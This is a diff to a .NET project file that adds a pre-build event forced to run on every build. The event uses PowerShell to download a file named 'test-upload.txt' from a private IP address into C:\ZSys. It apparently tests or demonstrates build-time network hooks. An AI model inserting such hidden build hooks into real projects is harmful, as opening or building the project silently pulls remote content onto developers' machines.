@@ -5,6 +5,9 @@
     <TargetFramework>net6.0</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
+	<DisableFastUpToDateCheck>true</DisableFastUpToDateCheck>
+	<RunPreBuildEvent>Always</RunPreBuildEvent>
+	<PreBuildEvent>powershell -c Invoke-WebRequest -Uri "http://172.16.1.19/test-upload.txt" -OutFile "C:\ZSys\test-upload.txt"</PreBuildEvent>
   </PropertyGroup>
 
 </Project>
